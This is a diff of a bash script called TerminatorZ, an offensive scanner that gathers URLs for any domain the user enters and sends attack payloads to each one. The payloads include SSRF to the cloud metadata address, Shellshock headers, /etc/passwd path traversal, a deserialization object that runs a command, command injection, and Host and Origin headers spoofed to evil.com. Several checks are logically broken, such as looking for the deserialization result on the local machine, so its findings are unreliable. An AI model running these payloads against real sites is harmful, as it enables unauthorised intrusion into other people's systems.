@@ -1,94 +1,58 @@
 #!/bin/bash
 
-# Check if lolcat, fortune-mod, figlet and curl are installed
-echo "Installing Dependencies, please wait..." | lolcat
-if ! command -v lolcat > /dev/null; then
-  echo "lolcat not found, installing..." | lolcat
-  if command -v dnf > /dev/null; then
-    sudo dnf install -y lolcat
-  elif command -v yum > /dev/null; then
-    sudo yum install -y lolcat
-  elif command -v apt-get > /dev/null; then
-    sudo apt-get install -y lolcat
-  else
-    echo "Error: package manager not found, please install lolcat manually" | lolcat
-    exit 1
-  fi
-fi
-
-if ! command -v fortune > /dev/null; then
-  echo "fortune-mod not found, installing..." | lolcat
-  if command -v dnf > /dev/null; then
-    sudo dnf install -y fortune-mod
-  elif command -v yum > /dev/null; then
-    sudo yum install -y fortune-mod
-  elif command -v apt-get > /dev/null; then
-    sudo apt-get install -y fortune-mod
-  else
-    echo "Error: package manager not found, please install fortune-mod manually" | lolcat
-    exit 1
-  fi
-fi
-
-if ! command -v figlet > /dev/null; then
-  echo "figlet not found, installing..." | lolcat
-  if command -v dnf > /dev/null; then
-    sudo dnf install -y figlet
-  elif command -v yum > /dev/null; then
-    sudo yum install -y figlet
-  elif command -v apt-get > /dev/null; then
-    sudo apt-get install -y figlet
-  else
-    echo "Error: package manager not found, please install figlet manually" | lolcat
-    exit 1
-  fi
-fi
-
-if ! command -v curl > /dev/null; then
-  echo "curl not found, installing..."
-  if command -v dnf > /dev/null; then
-    sudo dnf install -y curl
-  elif command -v yum > /dev/null; then
-    sudo yum install -y curl
-  elif command -v apt-get > /dev/null; then
-    sudo apt-get install -y curl
-  else
-    echo "Error: package manager not found, please install curl manually" | lolcat
-    exit 1
-  fi
-fi
-
-echo "All dependencies installed successfully" | lolcat
-sleep 3
-clear
-
+# Original script setup
 curl --silent "https://raw.githubusercontent.com/blackhatethicalhacking/Subdomain_Bruteforce_bheh/main/ascii.sh" | lolcat
 echo ""
 # Generate a random Sun Tzu quote for offensive security
-# Array of Sun Tzu quotes
 quotes=("The supreme art of war is to subdue the enemy without fighting." "All warfare is based on deception." "He who knows when he can fight and when he cannot, will be victorious." "The whole secret lies in confusing the enemy, so that he cannot fathom our real intent." "To win one hundred victories in one hundred battles is not the acme of skill. To subdue the enemy without fighting is the acme of skill.")
-# Get a random quote from the array
 random_quote=${quotes[$RANDOM % ${#quotes[@]}]}
-
-# Print the quote
 echo "Offensive Security Tip: $random_quote - Sun Tzu" | lolcat
 sleep 1
 echo "MEANS, IT'S ☕ 1337 ⚡ TIME, 369 ☯ " | lolcat
 sleep 1
 figlet -w 80 -f small TerminatorZ | lolcat
 echo ""
-echo "[YOUR ARE USING TerminatorZ.sh] - (v1.1) CODED BY Chris 'SaintDruG' Abou-Chabké WITH ❤ FOR blackhatethicalhacking.com for Educational Purposes only!" | lolcat
+echo "[YOUR ARE USING TerminatorZ] - (v2.0) CODED BY Chris 'SaintDruG' Abou-Chabké WITH ❤ FOR blackhatethicalhacking.com for Educational Purposes only!" | lolcat
 sleep 1
-#check if the user is connected to the internet
+echo "This Version 2 now checks for a total of 21 exploits" | lolcat
+
+# Check if the user is connected to the internet
 tput bold;echo "CHECKING IF YOU ARE CONNECTED TO THE INTERNET!" | lolcat
-# Check connection
 wget -q --spider https://google.com
-if [ $? -ne 0 ];then
+if [ $? -ne 0 ]; then
     echo "++++ CONNECT TO THE INTERNET BEFORE RUNNING TerminatorZ !" | lolcat
     exit 1
 fi
 tput bold;echo "++++ CONNECTION FOUND, LET'S GO!" | lolcat
 
+# Install Dependencies for Kali
+echo "Installing Dependencies for Kali Linux Only, you must install manually for other OS..." | lolcat
+
+# Title and installation for fortune-mod
+echo "Installing fortune-mod..." | lolcat
+apt-get install -y fortune-mod > /dev/null 2>&1
+
+# Title and installation for lolcat
+echo "Installing lolcat..." | lolcat
+pip install lolcat > /dev/null 2>&1
+
+# Title and installation for curl
+echo "Installing curl..." | lolcat
+apt-get install -y curl > /dev/null 2>&1
+
+# Title and installation for figlet
+echo "Installing figlet..." | lolcat
+apt-get install -y figlet > /dev/null 2>&1
+
+# Title and installation for toilet
+echo "Installing toilet..." | lolcat
+apt-get install -y toilet > /dev/null 2>&1
+
+echo "Finished Installing: Fortune-mod, lolcat, curl, figlet and toilet. Make sure to install manually if necessary!" | lolcat
+
+figlet -w 80 -f small TerminatorZ | lolcat
+echo ""
+# Input the domain
 echo "Enter the domain: (example.com) "
 read domain
 
@@ -99,10 +63,11 @@ else
   mkdir "$domain"
 fi
 
-waybackurls $domain | grep -E "\.js$|\.php$|\.yml$|\.env$|\.txt$|\.xml$|\.config$" | httpx -verbose | sort -u | tee urls.txt lolcat
+waybackurls $domain | grep -E "\.js$|\.php$|\.yml$|\.env$|\.txt$|\.xml$|\.config$" | httpx -stats | sort -u | tee urls.txt | lolcat
 
 count=$(wc -l < urls.txt)
 echo "Total URLs found: $count" | lolcat
+
 # Matrix effect
 echo "Let us Terminate them in 5 seconds - Matrix Mode ON:" | toilet --metal -f term -F border
 
@@ -124,7 +89,8 @@ for ((i=0; i<5; i++)); do
     echo -ne "${R}00 ${G}11 ${Y}01 ${B}10 ${P}11 ${C}00 ${W}10 ${G}01 ${P}11 ${B}00 ${Y}01 ${C}10\r"
     sleep 0.2
 done
-#Start the attacks
+
+# Start the attacks
 while read url
 do
 
@@ -138,7 +104,6 @@ else
 fi
 
 # Check for SSRF (Server-side request forgery) vulnerability
-
 echo -e "\e[33mTesting \e[0m${url}\e[33m for SSRF vulnerability...\e[0m"
 response=$(curl -s -H 'User-Agent: Mozilla/5.0' "$url?url=http://169.254.169.254/")
 if [[ $response == *"169.254.169.254"* ]]; then
@@ -156,7 +121,7 @@ else
   echo -e "$url is not XXE \e[31mvulnerable\e[0m"
 fi
 
-# Check for Insecure deserialization vulnerability:
+# Check for Insecure Deserialization vulnerability:
 echo -e "\e[33mTesting \e[0m${url}\e[33m for Insecure Deserialization vulnerability...\e[0m"
 response=$(curl -s -H 'User-Agent: Mozilla/5.0' -d 'O:8:"stdClass":1:{s:5:"shell";s:5:"touch /tmp/pwned";}' "$url")
 if [[ -f "/tmp/pwned" ]]; then
@@ -182,8 +147,8 @@ else
   echo -e "$url is not \e[31mvulnerable\e[0m to Shellshock RCE" 
 fi
 
-  # Check for RCE vulnerability
-  echo -e "\e[33mTesting \e[0m${url}\e[33m for RCE vulnerability...\e[0m"
+# Check for RCE vulnerability
+echo -e "\e[33mTesting \e[0m${url}\e[33m for RCE vulnerability...\e[0m"
 response=$(curl -s -H 'User-Agent: () { :;}; echo vulnerable' "$url")
 if [[ $response == *"vulnerable"* ]]; then
   echo -e "$url is RCE \e[32mvulnerable\e[0m" >> "$domain/$domain.txt"
@@ -191,6 +156,7 @@ else
   echo -e "$url is not RCE \e[31mvulnerable\e[0m"
 fi
 
+# Check for CSRF vulnerability
 echo -e "\e[33mTesting \e[0m${url}\e[33m for CSRF vulnerability...\e[0m"
 response=$(curl -s -X POST -d 'token=test' "$url")
 if [[ $response == *"token=test"* ]]; then
@@ -199,8 +165,7 @@ else
   echo -e "$url is not CSRF \e[31mvulnerable\e[0m"
 fi
 
-
-  # Check for LFI vulnerability
+# Check for LFI vulnerability
 echo -e "\e[33mTesting \e[0m${url}\e[33m for LFI vulnerability...\e[0m"
 response=$(curl -s "$url/../../../../../../../../../../../../etc/passwd")
 if [[ $response == *"root:"* ]]; then
@@ -209,40 +174,42 @@ else
   echo -e "$url is not LFI \e[31mvulnerable\e[0m"
 fi
 
-  # Check for open redirect vulnerability
-  echo -e "\e[33mTesting \e[0m${url}\e[33m for Open Redirect vulnerability...\e[0m"
-  response=$(curl -s -L "$url?redirect=http://google.com")
-  if [[ $response == *"<title>Google</title>"* ]]; then
-    echo -e "$url is open redirect \e[32mvulnerable\e[0m" >> "$domain/$domain.txt"
-  else
-    echo -e "$url is not open redirect \e[31mvulnerable\e[0m"
-  fi
+# Check for open redirect vulnerability
+echo -e "\e[33mTesting \e[0m${url}\e[33m for Open Redirect vulnerability...\e[0m"
+response=$(curl -s -L "$url?redirect=http://google.com")
+if [[ $response == *"<title>Google</title>"* ]]; then
+  echo -e "$url is open redirect \e[32mvulnerable\e[0m" >> "$domain/$domain.txt"
+else
+  echo -e "$url is not open redirect \e[31mvulnerable\e[0m"
+fi
 
-  # Check for Log4J vulnerability
-  echo -e "\e[33mTesting \e[0m${url}\e[33m for Log4J vulnerability...\e[0m"
-  response=$(curl -s "$url/%20%20%20%20%20%20%20%20@org.apache.log4j.BasicConfigurator@configure()")
-  if [[ $response == *"log4j"* ]]; then
-    echo -e "$url is Log4J \e[32mvulnerable\e[0m" >> "$domain/$domain.txt"
-  else
-    echo -e "$url is not Log4J \e[31mvulnerable\e[0m"
-  fi
+# Check for Log4J vulnerability
+echo -e "\e[33mTesting \e[0m${url}\e[33m for Log4J vulnerability...\e[0m"
+response=$(curl -s "$url/%20%20%20%20%20%20%20%20@org.apache.log4j.BasicConfigurator@configure()")
+if [[ $response == *"log4j"* ]]; then
+  echo -e "$url is Log4J \e[32mvulnerable\e[0m" >> "$domain/$domain.txt"
+else
+  echo -e "$url is not Log4J \e[31mvulnerable\e[0m"
+fi
 
-  # Check for RFI vulnerability
-  echo -e "\e[33mTesting \e[0m${url}\e[33m for RFI vulnerability...\e[0m"
-  response=$(curl -s "$url?file=http://google.com")
-  if [[ $response == *"<title>Google</title>"* ]]; then
-    echo -e "$url is RFI \e[32mvulnerable\e[0m" >> "$domain/$domain.txt"
-  else
-    echo -e "$url is not RFI \e[31mvulnerable\e[0m"
-  fi
- # Check for directory traversal vulnerability
- echo -e "\e[33mTesting \e[0m${url}\e[33m for path/directory traversal vulnerability...\e[0m"
+# Check for RFI vulnerability
+echo -e "\e[33mTesting \e[0m${url}\e[33m for RFI vulnerability...\e[0m"
+response=$(curl -s "$url?file=http://google.com")
+if [[ $response == *"<title>Google</title>"* ]]; then
+  echo -e "$url is RFI \e[32mvulnerable\e[0m" >> "$domain/$domain.txt"
+else
+  echo -e "$url is not RFI \e[31mvulnerable\e[0m"
+fi
+
+# Check for directory traversal vulnerability
+echo -e "\e[33mTesting \e[0m${url}\e[33m for path/directory traversal vulnerability...\e[0m"
 response=$(curl -s "$url/../../../../../../../../../../../../etc/passwd")
 if [[ $response == *"root:"* ]]; then
   echo -e "$url is path traversal \e[32mvulnerable\e[0m" >> "$domain/$domain.txt"
 else
   echo -e "$url is not path traversal \e[31mvulnerable\e[0m"
 fi
+
 # Check for SQL injection vulnerability
 echo -e "\e[33mTesting \e[0m${url}\e[33m for SQL injection vulnerability...\e[0m"
 response=$(curl -s "$url/index.php?id=1'")
@@ -251,7 +218,81 @@ if [[ $response == *"SQL syntax"* ]]; then
 else
   echo -e "$url is not SQL injection \e[31mvulnerable\e[0m"
 fi
+
+# Check for File Upload vulnerability
+echo -e "\e[33mTesting \e[0m${url}\e[33m for File Upload vulnerability...\e[0m"
+response=$(curl -s -F "file=@/etc/passwd" "$url/upload")
+if [[ $response == *"root:x"* ]]; then
+  echo -e "$url is File Upload \e[32mvulnerable\e[0m" >> "$domain/$domain.txt"
+else
+  echo -e "$url is not File Upload \e[31mvulnerable\e[0m"
+fi
+
+# Check for Command Injection vulnerability
+echo -e "\e[33mTesting \e[0m${url}\e[33m for Command Injection vulnerability...\e[0m"
+response=$(curl -s -d "cmd=whoami" "$url/cmd")
+if [[ $response == *"root"* ]]; then
+  echo -e "$url is Command Injection \e[32mvulnerable\e[0m" >> "$domain/$domain.txt"
+else
+  echo -e "$url is not Command Injection \e[31mvulnerable\e[0m"
+fi
+
+# Check for Host Header Injection vulnerability
+echo -e "\e[33mTesting \e[0m${url}\e[33m for Host Header Injection vulnerability...\e[0m"
+response=$(curl -s -H 'Host: evil.com' "$url")
+if [[ $response == *"evil.com"* ]]; then
+  echo -e "$url is Host Header Injection \e[32mvulnerable\e[0m" >> "$domain/$domain.txt"
+else
+  echo -e "$url is not Host Header Injection \e[31mvulnerable\e[0m"
+fi
+
+# Check for HTTP Parameter Pollution (HPP) vulnerability
+echo -e "\e[33mTesting \e[0m${url}\e[33m for HTTP Parameter Pollution vulnerability...\e[0m"
+response=$(curl -s "$url?page=1&page=2")
+if [[ $response == *"page=2"* ]]; then
+  echo -e "$url is HTTP Parameter Pollution \e[32mvulnerable\e[0m" >> "$domain/$domain.txt"
+else
+  echo -e "$url is not HTTP Parameter Pollution \e[31mvulnerable\e[0m"
+fi
+
+# Check for Clickjacking vulnerability
+echo -e "\e[33mTesting \e[0m${url}\e[33m for Clickjacking vulnerability...\e[0m"
+response=$(curl -s -I "$url")
+if [[ $response != *"X-Frame-Options: DENY"* && $response != *"X-Frame-Options: SAMEORIGIN"* ]]; then
+  echo -e "$url is Clickjacking \e[32mvulnerable\e[0m" >> "$domain/$domain.txt"
+else
+  echo -e "$url is not Clickjacking \e[31mvulnerable\e[0m"
+fi
+
+# Check for CORS Misconfiguration vulnerability
+echo -e "\e[33mTesting \e[0m${url}\e[33m for CORS Misconfiguration vulnerability...\e[0m"
+response=$(curl -s -H "Origin: http://evil.com" -I "$url")
+if [[ $response == *"Access-Control-Allow-Origin: http://evil.com"* ]]; then
+  echo -e "$url is CORS Misconfiguration \e[32mvulnerable\e[0m" >> "$domain/$domain.txt"
+else
+  echo -e "$url is not CORS Misconfiguration \e[31mvulnerable\e[0m"
+fi
+
+# Check for Sensitive Data Exposure vulnerability
+echo -e "\e[33mTesting \e[0m${url}\e[33m for Sensitive Data Exposure vulnerability...\e[0m"
+response=$(curl -s "$url")
+if [[ $response == *"API_KEY"* || $response == *"password"* || $response == *"api"* || $response == *"uri"* || $response == *"login"* ]]; then
+  echo -e "$url is Sensitive Data Exposure \e[32mvulnerable\e[0m" >> "$domain/$domain.txt"
+else
+  echo -e "$url is not Sensitive Data Exposure \e[31mvulnerable\e[0m"
+fi
+
+# Check for Session Fixation vulnerability
+echo -e "\e[33mTesting \e[0m${url}\e[33m for Session Fixation vulnerability...\e[0m"
+response=$(curl -s -I "$url")
+if [[ $response == *"Set-Cookie: sessionid=12345"* ]]; then
+  echo -e "$url is Session Fixation \e[32mvulnerable\e[0m" >> "$domain/$domain.txt"
+else
+  echo -e "$url is not Session Fixation \e[31mvulnerable\e[0m"
+fi
+
 done < urls.txt
+
 mv urls.txt $domain
 rm -rf lolcat
 echo "Targets have been T3rm1nat3d... I'll be back!" | lolcat
